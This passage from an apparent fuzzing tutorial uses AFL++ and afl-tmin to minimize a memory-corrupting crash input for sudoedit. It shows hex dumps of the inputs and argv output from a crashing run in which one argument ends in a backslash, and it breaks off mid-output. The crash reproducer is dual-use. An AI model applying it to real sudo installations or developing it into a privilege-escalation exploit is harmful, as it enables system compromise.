</span></span></code></pre></div><p>Seems like a memory corruption crash. These are interesting and we should investiage. But before we do so, one more little thing.</p><h4 id=afl-exploration-mode>AFL++ exploration mode</h4><p>AFL++ offers the exploration mode with <code>-C</code>. In this mode, AFL++ takes as seed <em><strong>crashing</strong></em> inputs and tries to find other crashes at different locations. This mode can be used to expand 1 single crash that you may have to many crashes so that you can use differential analysis afterwards.</p><h3 id=minimal-crash-poc>Minimal crash PoC</h3><p>Now that we have a crashing input that leads to memory corruption, it is time to minimize it. <code>afl-tmin</code> can minimize a crashing input so that only the significant bytes are kept which still trigger the crash. Other irrelevent bytes that do not affect the crash are iteratitevly removed.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user:~/mount/sudoedit$ afl-tmin -i outputs-sudoedit/default/crashes/id<span style=color:#ae81ff>\:</span>000000* -o minimized.in sudo-afl
</span></span><span style=display:flex><span>afl-tmin++4.10c by Michal Zalewski
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Read <span style=color:#ae81ff>250</span> bytes from <span style=color:#e6db74>&#39;outputs-sudoedit/default/crashes/id:000000,sig:06,src:000318+000311,time:905880,execs:970028,op:splice,rep:2&#39;</span>.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Spinning up the fork server...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> All right - fork server is up.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Target map size: <span style=color:#ae81ff>9463</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Performing dry run <span style=color:#f92672>(</span>mem limit <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span> MB, timeout <span style=color:#f92672>=</span> <span style=color:#ae81ff>1000</span> ms<span style=color:#f92672>)</span>...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Program exits with a signal, minimizing in crash mode.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stage <span style=color:#75715e>#0: One-time block normalization...</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Block normalization complete, <span style=color:#ae81ff>226</span> bytes replaced.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> --- Pass <span style=color:#75715e>#1 ---</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stage <span style=color:#75715e>#1: Removing blocks of data...</span>
</span></span><span style=display:flex><span>    Block length <span style=color:#f92672>=</span> 16, remaining size <span style=color:#f92672>=</span> <span style=color:#ae81ff>250</span>
</span></span><span style=display:flex><span>    Block length <span style=color:#f92672>=</span> 8, remaining size <span style=color:#f92672>=</span> <span style=color:#ae81ff>192</span>
</span></span><span style=display:flex><span>    Block length <span style=color:#f92672>=</span> 4, remaining size <span style=color:#f92672>=</span> <span style=color:#ae81ff>192</span>
</span></span><span style=display:flex><span>    Block length <span style=color:#f92672>=</span> 2, remaining size <span style=color:#f92672>=</span> <span style=color:#ae81ff>180</span>
</span></span><span style=display:flex><span>    Block length <span style=color:#f92672>=</span> 1, remaining size <span style=color:#f92672>=</span> <span style=color:#ae81ff>178</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Block removal complete, <span style=color:#ae81ff>73</span> bytes deleted.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stage <span style=color:#75715e>#2: Minimizing symbols (10 code points)...</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Symbol minimization finished, <span style=color:#ae81ff>2</span> symbols <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> bytes<span style=color:#f92672>)</span> replaced.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stage <span style=color:#75715e>#3: Character minimization...</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Character minimization <span style=color:#66d9ef>done</span>, <span style=color:#ae81ff>1</span> byte replaced.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> --- Pass <span style=color:#75715e>#2 ---</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Stage <span style=color:#75715e>#1: Removing blocks of data...</span>
</span></span><span style=display:flex><span>    Block length <span style=color:#f92672>=</span> 16, remaining size <span style=color:#f92672>=</span> <span style=color:#ae81ff>177</span>
</span></span><span style=display:flex><span>    Block length <span style=color:#f92672>=</span> 8, remaining size <span style=color:#f92672>=</span> <span style=color:#ae81ff>177</span>
</span></span><span style=display:flex><span>    Block length <span style=color:#f92672>=</span> 4, remaining size <span style=color:#f92672>=</span> <span style=color:#ae81ff>177</span>
</span></span><span style=display:flex><span>    Block length <span style=color:#f92672>=</span> 2, remaining size <span style=color:#f92672>=</span> <span style=color:#ae81ff>177</span>
</span></span><span style=display:flex><span>    Block length <span style=color:#f92672>=</span> 1, remaining size <span style=color:#f92672>=</span> <span style=color:#ae81ff>177</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Block removal complete, <span style=color:#ae81ff>0</span> bytes deleted.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     File size reduced by : 29.20% <span style=color:#f92672>(</span>to <span style=color:#ae81ff>177</span> bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Characters simplified : 129.38%
</span></span><span style=display:flex><span>     Number of execs <span style=color:#66d9ef>done</span> : <span style=color:#ae81ff>180</span>
</span></span><span style=display:flex><span>          Fruitless execs : path<span style=color:#f92672>=</span><span style=color:#ae81ff>110</span> crash<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> hang<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Writing output to <span style=color:#e6db74>&#39;minimized.in&#39;</span>...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> We<span style=color:#960050;background-color:#1e0010>&#39;</span>re <span style=color:#66d9ef>done</span> here. Have a nice day!
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>user:~/mount/sudoedit$ xxd -g <span style=color:#ae81ff>1</span> outputs-sudoedit/default/crashes/id<span style=color:#ae81ff>\:</span>000000*
</span></span><span style=display:flex><span>00000000: f3 <span style=color:#ae81ff>64</span> 7f ff <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>64</span> 6f <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>68</span> 6c <span style=color:#ae81ff>00</span>  .d..udoedit.-hl.
</span></span><span style=display:flex><span>00000010: 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>49</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>59</span> c8 c8 c8 c8 c8 c8  -i.iId.-.Y......
</span></span><span style=display:flex><span>00000020: <span style=color:#ae81ff>81</span> 5f 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>69</span> db <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>96</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>73</span>  ._l.-i.i.t.s...s
</span></span><span style=display:flex><span>00000030: bd bd bd <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>96</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span> 7f  ...t.s...sss.d..
</span></span><span style=display:flex><span>00000040: <span style=color:#ae81ff>73</span> f3 <span style=color:#ae81ff>64</span> 7f ff ff ff f3 <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>65</span> 3d <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>00</span>  s.d.....dit.e<span style=color:#f92672>=</span>..
</span></span><span style=display:flex><span>00000050: 6b 6f <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> 1a 2d <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>64</span>  koit.-h.ad.-h..d
</span></span><span style=display:flex><span>00000060: 6f <span style=color:#ae81ff>00</span> 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> ec <span style=color:#ae81ff>78</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> c8  o.l.-i.ish.xdit.
</span></span><span style=display:flex><span>00000070: c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 c8 <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>81</span>  ..............s.
</span></span><span style=display:flex><span>00000080: 5f 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>69</span> db <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>96</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span>  _l.-i.i.t.s...ss
</span></span><span style=display:flex><span>00000090: <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>88</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>96</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>02</span> <span style=color:#ae81ff>35</span> 7f <span style=color:#ae81ff>35</span> <span style=color:#ae81ff>35</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span>  sss.t.s...5.55d.
</span></span><span style=display:flex><span>000000a0: 7f <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>64</span> 5f 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> 5b <span style=color:#ae81ff>70</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span>  .ssd_l.-dit<span style=color:#f92672>[</span>p.-i
</span></span><span style=display:flex><span>000000b0: <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>71</span> <span style=color:#ae81ff>24</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> 5a <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>21</span>  iiiiiis.q$diZ.-!
</span></span><span style=display:flex><span>000000c0: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>79</span> 5c 5c 5c <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>10</span> 5c 5c 5c <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>92</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> 1a 2d  0y<span style=color:#ae81ff>\\\.</span>.<span style=color:#ae81ff>\\\.</span>.it.-
</span></span><span style=display:flex><span>000000d0: <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>68</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>64</span> 6f <span style=color:#ae81ff>00</span> 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span>  h.ad..h..do.l.-i
</span></span><span style=display:flex><span>000000e0: <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>68</span> ec <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>00</span> 7f <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>64</span> 5f  .ish..-i.d..ssd_
</span></span><span style=display:flex><span>000000f0: 6c <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> 2f 2f <span style=color:#ae81ff>69</span> db <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>96</span>                    l.-i//i...
</span></span><span style=display:flex><span>user:~/mount/sudoedit$ xxd -g <span style=color:#ae81ff>1</span> minimized.in
</span></span><span style=display:flex><span>00000000: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>00</span> 2d <span style=color:#ae81ff>69</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  0edit.-i.0000000
</span></span><span style=display:flex><span>00000010: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>0000000000000000</span>
</span></span><span style=display:flex><span>00000020: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>0000000000000000</span>
</span></span><span style=display:flex><span>00000030: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>0000000000000000</span>
</span></span><span style=display:flex><span>00000040: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>0000000000000000</span>
</span></span><span style=display:flex><span>00000050: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>0000000000000000</span>
</span></span><span style=display:flex><span>00000060: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>0000000000000000</span>
</span></span><span style=display:flex><span>00000070: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>0000000000000000</span>
</span></span><span style=display:flex><span>00000080: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> 5c <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  00000<span style=color:#ae81ff>\.</span><span style=color:#ae81ff>000000000</span>
</span></span><span style=display:flex><span>00000090: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>0000000000000000</span>
</span></span><span style=display:flex><span>000000a0: <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>0000000000000000</span>
</span></span><span style=display:flex><span>000000b0: <span style=color:#ae81ff>30</span>                                               <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>Let&rsquo;s also verify that the new minimized input stil crashes the binary in the same way:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>user:~/mount/sudoedit$ cat minimized.in | sudo-afl
</span></span><span style=display:flex><span>after:
</span></span><span style=display:flex><span>argc<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>0<span style=color:#f92672>]=</span>0edit
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>1<span style=color:#f92672>]=</span>-i
</span></span><span style=display:flex><span>argv<span style=color:#f92672>[</span>2<span style=color:#f92672>]=</span>0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>argv<span style=color:#f92672>[</span>3<span style=color:#f92672>]=</span><span style=color:#ae81ff>000000000000000000000000000000000000000000</span>
</span></span><span style=display:flex><span>envp:
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>00<span style=color:#f92672>]=</span>HOSTNAME<span style=color:#f92672>=</span>c9414e2626a9
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>01<span style=color:#f92672>]=</span>PWD<span style=color:#f92672>=</span>/home/user/mount/sudoedit
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>02<span style=color:#f92672>]=</span>HOME<span style=color:#f92672>=</span>/home/user
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>03<span style=color:#f92672>]=</span>LS_COLORS<span style=color:#f92672>=</span>rs<span style=color:#f92672>=</span>0:di<span style=color:#f92672>=</span>01;34:ln<span style=color:#f92672>=</span>01;36:mh<span style=color:#f92672>=</span>00:pi<span style=color:#f92672>=</span>40;33:so<span style=color:#f92672>=</span>01;35:do<span style=color:#f92672>=</span>01;35:bd<span style=color:#f92672>=</span>40;33;01:cd<span style=color:#f92672>=</span>40;33;01:or<span style=color:#f92672>=</span>40;31;01:mi<span style=color:#f92672>=</span>00:su<span style=color:#f92672>=</span>37;41:sg<span style=color:#f92672>=</span>30;43:ca<span style=color:#f92672>=</span>00:tw<span style=color:#f92672>=</span>30;42:ow<span style=color:#f92672>=</span>34;42:st<span style=color:#f92672>=</span>37;44:ex<span style=color:#f92672>=</span>01;32:*.tar<span style=color:#f92672>=</span>01;31:*.tgz<span style=color:#f92672>=</span>01;31:*.arc<span style=color:#f92672>=</span>01;31:*.arj<span style=color:#f92672>=</span>01;31:*.taz<span style=color:#f92672>=</span>01;31:*.lha<span style=color:#f92672>=</span>01;31:*.lz4<span style=color:#f92672>=</span>01;31:*.lzh<span style=color:#f92672>=</span>01;31:*.lzma<span style=color:#f92672>=</span>01;31:*.tlz<span style=color:#f92672>=</span>01;31:*.txz<span style=color:#f92672>=</span>01;31:*.tzo<span style=color:#f92672>=</span>01;31:*.t7z<span style=color:#f92672>=</span>01;31:*.zip<span style=color:#f92672>=</span>01;31:*.z<span style=color:#f92672>=</span>01;31:*.dz<span style=color:#f92672>=</span>01;31:*.gz<span style=color:#f92672>=</span>01;31:*.lrz<span style=color:#f92672>=</span>01;31:*.lz<span style=color:#f92672>=</span>01;31:*.lzo<span style=color:#f92672>=</span>01;31:*.xz<span style=color:#f92672>=</span>01;31:*.zst<span style=color:#f92672>=</span>01;31:*.tzst<span style=color:#f92672>=</span>01;31:*.bz2<span style=color:#f92672>=</span>01;31:*.bz<span style=color:#f92672>=</span>01;31:*.tbz<span style=color:#f92672>=</span>01;31:*.tbz2<span style=color:#f92672>=</span>01;31:*.tz<span style=color:#f92672>=</span>01;31:*.deb<span style=color:#f92672>=</span>01;31:*.rpm<span style=color:#f92672>=</span>01;31:*.jar<span style=color:#f92672>=</span>01;31:*.war<span style=color:#f92672>=</span>01;31:*.ear<span style=color:#f92672>=</span>01;31:*.sar<span style=color:#f92672>=</span>01;31:*.rar<span style=color:#f92672>=</span>01;31:*.alz<span style=color:#f92672>=</span>01;31:*.ace<span style=color:#f92672>=</span>01;31:*.zoo<span style=color:#f92672>=</span>01;31:*.cpio<span style=color:#f92672>=</span>01;31:*.7z<span style=color:#f92672>=</span>01;31:*.rz<span style=color:#f92672>=</span>01;31:*.cab<span style=color:#f92672>=</span>01;31:*.wim<span style=color:#f92672>=</span>01;31:*.swm<span style=color:#f92672>=</span>01;31:*.dwm<span style=color:#f92672>=</span>01;31:*.esd<span style=color:#f92672>=</span>01;31:*.avif<span style=color:#f92672>=</span>01;35:*.jpg<span style=color:#f92672>=</span>01;35:*.jpeg<span style=color:#f92672>=</span>01;35:*.mjpg<span style=color:#f92672>=</span>01;35:*.mjpeg<span style=color:#f92672>=</span>01;35:*.gif<span style=color:#f92672>=</span>01;35:*.bmp<span style=color:#f92672>=</span>01;35:*.pbm<span style=color:#f92672>=</span>01;35:*.pgm<span style=color:#f92672>=</span>01;35:*.ppm<span style=color:#f92672>=</span>01;35:*.tga<span style=color:#f92672>=</span>01;35:*.xbm<span style=color:#f92672>=</span>01;35:*.xpm<span style=color:#f92672>=</span>01;35:*.tif<span style=color:#f92672>=</span>01;35:*.tiff<span style=color:#f92672>=</span>01;35:*.png<span style=color:#f92672>=</span>01;35:*.svg<span style=color:#f92672>=</span>01;35:*.svgz<span style=color:#f92672>=</span>01;35:*.mng<span style=color:#f92672>=</span>01;35:*.pcx<span style=color:#f92672>=</span>01;35:*.mov<span style=color:#f92672>=</span>01;35:*.mpg<span style=color:#f92672>=</span>01;35:*.mpeg<span style=color:#f92672>=</span>01;35:*.m2v<span style=color:#f92672>=</span>01;35:*.mkv<span style=color:#f92672>=</span>01;35:*.webm<span style=color:#f92672>=</span>01;35:*.webp<span style=color:#f92672>=</span>01;35:*.ogm<span style=color:#f92672>=</span>01;35:*.mp4<span style=color:#f92672>=</span>01;35:*.m4v<span style=color:#f92672>=</span>01;35:*.mp4v<span style=color:#f92672>=</span>01;35:*.vob<span style=color:#f92672>=</span>01;35:*.qt<span style=color:#f92672>=</span>01;35:*.nuv<span style=color:#f92672>=</span>01;35:*.wmv<span style=color:#f92672>=</span>01;35:*.asf<span style=color:#f92672>=</span>01;35:*.rm<span style=color:#f92672>=</span>01;35:*.rmvb<span style=color:#f92672>=</span>01;35:*.flc<span style=color:#f92672>=</span>01;35:*.avi<span style=color:#f92672>=</span>01;35:*.fli<span style=color:#f92672>=</span>01;35:*.flv<span style=color:#f92672>=</span>01;35:*.gl<span style=color:#f92672>=</span>01;35:*.dl<span style=color:#f92672>=</span>01;35:*.xcf<span style=color:#f92672>=</span>01;35:*.xwd<span style=color:#f92672>=</span>01;35:*.yuv<span style=color:#f92672>=</span>01;35:*.cgm<span style=color:#f92672>=</span>01;35:*.emf<span style=color:#f92672>=</span>01;35:*.ogv<span style=color:#f92672>=</span>01;35:*.ogx<span style=color:#f92672>=</span>01;35:*.aac<span style=color:#f92672>=</span>00;36:*.au<span style=color:#f92672>=</span>00;36:*.flac<span style=color:#f92672>=</span>00;36:*.m4a<span style=color:#f92672>=</span>00;36:*.mid<span style=color:#f92672>=</span>00;36:*.midi<span style=color:#f92672>=</span>00;36:*.mka<span style=color:#f92672>=</span>00;36:*.mp3<span style=color:#f92672>=</span>00;36:*.mpc<span style=color:#f92672>=</span>00;36:*.ogg<span style=color:#f92672>=</span>00;36:*.ra<span style=color:#f92672>=</span>00;36:*.wav<span style=color:#f92672>=</span>00;36:*.oga<span style=color:#f92672>=</span>00;36:*.opus<span style=color:#f92672>=</span>00;36:*.spx<span style=color:#f92672>=</span>00;36:*.xspf<span style=color:#f92672>=</span>00;36:*~<span style=color:#f92672>=</span>00;90:*#<span style=color:#f92672>=</span>00;90:*.bak<span style=color:#f92672>=</span>00;90:*.old<span style=color:#f92672>=</span>00;90:*.orig<span style=color:#f92672>=</span>00;90:*.part<span style=color:#f92672>=</span>00;90:*.rej<span style=color:#f92672>=</span>00;90:*.swp<span style=color:#f92672>=</span>00;90:*.tmp<span style=color:#f92672>=</span>00;90:*.dpkg-dist<span style=color:#f92672>=</span>00;90:*.dpkg-old<span style=color:#f92672>=</span>00;90:*.ucf-dist<span style=color:#f92672>=</span>00;90:*.ucf-new<span style=color:#f92672>=</span>00;90:*.ucf-old<span style=color:#f92672>=</span>00;90:*.rpmnew<span style=color:#f92672>=</span>00;90:*.rpmorig<span style=color:#f92672>=</span>00;90:*.rpmsave<span style=color:#f92672>=</span>00;90:
</span></span><span style=display:flex><span>envp<span style=color:#f92672>[</span>04<span style=color:#f92672>]=</span>TERM<span style=color:#f92672>=</span>xterm-256color
